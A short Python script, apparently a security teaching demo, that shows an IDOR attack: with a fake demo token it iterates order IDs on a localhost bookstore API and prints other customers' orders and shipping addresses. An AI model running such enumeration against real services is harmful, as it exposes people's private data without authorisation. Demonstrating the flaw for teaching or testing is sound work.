"""What an attacker does with a valid account: walk the order IDs and read what comes back."""
import os
import sys

import httpx

BASE = os.environ.get("BASE", "http://localhost:8000")
ALICE = {"Authorization": "Bearer demo-token-alice"}  # fake demo token

found = 0
with httpx.Client(base_url=BASE, headers=ALICE) as client:
    for order_id in range(1000, 1011):
        r = client.get(f"/orders/{order_id}")
        if r.status_code == 200 and r.json()["customer_id"] != 1:
            found += 1
            o = r.json()
            print(f"{order_id}: {r.status_code} customer {o['customer_id']}, "
                  f"{o['book']}, ship to {o['ship_to']}")
        else:
            print(f"{order_id}: {r.status_code}")
print(f"Orders of other customers read: {found}", file=sys.stderr)
